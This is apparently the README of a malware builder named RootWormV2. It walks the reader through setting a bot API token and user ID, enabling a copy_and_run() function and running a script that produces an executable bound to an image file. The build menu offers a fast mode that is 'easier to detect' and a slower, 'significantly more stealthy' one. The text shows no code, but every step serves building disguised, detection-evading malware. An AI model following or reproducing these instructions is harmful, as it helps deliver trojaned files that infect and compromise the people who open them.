# Project Setup & Execution Instructions

This script is built with **Python 3.10.0**.

1. Install Dependencies
```bash
pip install -r requirements.txt
```

## 2. Configure the Script

    Make sure to set your Bot API token and User ID in the `config.py` file:

    ![Step 1: change token](image/config.png)

    Line 23: `API_TOKEN`

    Line 24: `USER_ID`

    Make sure to set your variables in minify_script.py

    Line 7: `source_dir` — set to your source directory path

    Line 8: `output_dir` — set to your desired output directory path

    Ensure that the `copy_and_run()` function is UNCOMMETED in both of the following files:

    Line 54:  lib/func.py 

    line 325: bot.py  

3. Optional: Minify the Project

```bash
python minify_script.py
```

4. Change your Directory

    Go in your new output_dir which you indicated earlier!!! to run RootWormV2.py

5. Launch the Main Script

```bash
python RootWormV2.py
```

6. Runtime Options

    Enter the name for the generated executable file.

    Select an image file (any format) to bind to the executable.

    Choose the installation mode:

    Option 1 – Fast build (1–2 minutes), but easier to detect.
    Option 2 – Slower build (5–15 minutes), but significantly more stealthy.